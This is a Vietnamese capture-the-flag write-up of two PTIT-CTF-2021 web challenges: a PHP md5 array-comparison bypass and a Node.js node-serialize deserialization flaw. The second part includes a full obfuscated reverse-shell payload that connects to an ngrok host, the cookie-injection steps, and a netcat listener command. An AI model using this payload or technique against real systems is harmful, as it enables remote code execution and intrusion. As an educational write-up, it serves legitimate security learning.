[PTIT-CTF-2021] WEB - Recon

Description: Can you recon where flag is hidding in this website ???? URL: http://34.84.29.1:2412/

Bạn có thể trinh sát flag ẩn trong trang web này không? 

Dạo vòng quanh web thì thấy có endpoint  `/demo` có thể truy cập, view source tại phần comment các bạn có thể thấy vài bình luận nhưng có bình luận khá đặc biệt

```
<!-- /demo/somesecretimages/image-00.png,  00 or 01 ???-->
```

Các hình ảnh đều theo format qrcode. Thử truy cập vào ảnh, ở image-00.png và image-01.png  parsed các đoạn text phần nào gợi ý rằng flag sẽ nằm ở đâu đấy sau khi decode bức ảnh nào đấy   :vv

![1.png](https://github.com/hatunaa/ctf-writeups/blob/master/2021/PTIT_CTF_2021/images/1.png)

![2.png](https://github.com/hatunaa/ctf-writeups/blob/master/2021/PTIT_CTF_2021/images/2.png)

Số 14 trong phần ` /demo`, truy cập vào cũng ra 1 ảnh dạng qrcode. Ok lại decode thôi, ở đây text sẽ là  `the real challenge: /ch4ll3ng3/` và đây là endpoit để ra được flag.

Dưới đây là code sau khi truy cập vào `/ch4ll3ng3/`:

``` php
<?php 
include('flag.php');
highlight_file(__FILE__); 
error_reporting(0); 
$apple = $_GET['apple']; 
$banana = $_GET['banana']; 
if(isset($_GET['apple']) && isset($_GET['banana'])){ 
    if($apple !== $banana){ 
        if(hash('md5', $salt . $apple) == hash('md5', $salt . $banana)){ 
            echo $flag; 
        } 
    }
} 
?>
```

Đoạn trên có ý nghĩa so sách giá trị của hai  args, nếu khác nhau thì sẽ hiển thị $flag

Bên dưới thì đây là payload của mình, truy cập và nhận cờ.

`http://34.84.29.1:2412/ch4ll3ng3/?apple[12]=123&banana[2]=122`

Flag:  PTIT{fake_flag}



======================================================================



[PTIT-CTF-2021] WEB - Rick Roll

Hôm nay khá bận nên mình cố gắng viết ngắn gọn nhất có thể, phần nào chưa rõ các bạn tìm hiểu thêm nhé. 

tl;dr

Thử thách tồn tại lỗ hổng deserialize trong nodejs, cho phép dữ liệu không đáng tin cậy được chuyển vào hàm unserialize() dẫn đến RCE bằng cách chuyển đổi serialized Javascript Object

với IEFE

**Bug**

Lỗ hổng trong thử thách là giá trị cookie trong yêu cầu HTTP.  Bây giờ có thể khai thác hàm unserialize() trong module node-serialize nếu dữ liệu không đáng tin cậy được truyền vào. Khai thác lỗ hổng để tạo một Reverse Shell.

![3.png](https://github.com/hatunaa/ctf-writeups/blob/master/2021/PTIT_CTF_2021/images/3.png)

--> base64 decode:

![4.png](https://github.com/hatunaa/ctf-writeups/blob/master/2021/PTIT_CTF_2021/images/4.png)



**Exploit**

Tạo một đường hầm ngrok TCP để nat ip với port ra ngoài

```
#./ngrok tcp 8083
```

output:

![5.png](https://github.com/hatunaa/ctf-writeups/blob/master/2021/PTIT_CTF_2021/images/5.png)

Ở đây mình dùng [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) để tạo reverse shell.

Set argument là host và port của ngrok như thế này để gen payload.

```
$python3 nodejsshell.py 4.tcp.ngrok.io:12497 8083
[+] LHOST = 4.tcp.ngrok.io:12497
[+] LPORT = 8083
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,52,46,116,99,112,46,110,103,114,111,107,46,105,111,58,49,50,52,57,55,34,59,10,80,79,82,84,61,34,56,48,56,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))

```

Bây giờ gen một payload serialized với javascript sau:

```javascript
var y = {
rce : function() {}
}
var serialize = require(‘node-serialize’);
console.log(“Serialized: \n” + serialize.serialize(y)); 
```

![6.png](https://github.com/hatunaa/ctf-writeups/blob/master/2021/PTIT_CTF_2021/images/6.png)

Chèn payload trong dấu ngoặc nhọn **{** *eval (String.from ………* **}** như hình dưới đây: 

![7.png](https://github.com/hatunaa/ctf-writeups/blob/master/2021/PTIT_CTF_2021/images/7.png)

Lưu tệp dưới dạng **mining.js** và chạy bằng lệnh node tạo ra payload serialized  được hiển thị bên dưới: 

![8.png](https://github.com/hatunaa/ctf-writeups/blob/master/2021/PTIT_CTF_2021/images/8.png)

Bây giờ quay lại BurpSuite và điều hướng đến tab decoder và paste mã  đầu ra ở trên vào text để và encode base64, các bạn hãy thêm [dấu ngoặc IIFE ](http://benalman.com/news/2010/11/immediately-invoked-function-expression/)() sau nội dung hàm như hình dưới đây: 

![9.png](https://github.com/hatunaa/ctf-writeups/blob/master/2021/PTIT_CTF_2021/images/9.png)

Trong tab Repeater, bạn cần thay thế giá trị cookie bằng giá trị được mã hóa base64 mà chúng ta đã tạo từ bước trên và sau đó nhấp  *Send*.

![10.png](https://github.com/hatunaa/ctf-writeups/blob/master/2021/PTIT_CTF_2021/images/10.png)

Bên cạnh đó, các bạn có thể set lại dịch vụ netcat của bạn đang listen có trên cùng một port không, tức là 8083 (cùng một cổng cho payload reverse shell )

```
Lệnh: nc -nlvp 8083
```

Ngay sau khi nhấp vào Send, request sẽ được gửi đến máy chủ hiển thị 200 OK và kết nối thành công trên  port 8083 lúc này tiến hành reverse shell để lấy flag

![11.png](https://github.com/hatunaa/ctf-writeups/blob/master/2021/PTIT_CTF_2021/images/11.png)

Flag ở trong file Dockerfile, cat ra sẽ thấy liền :vv



========================================
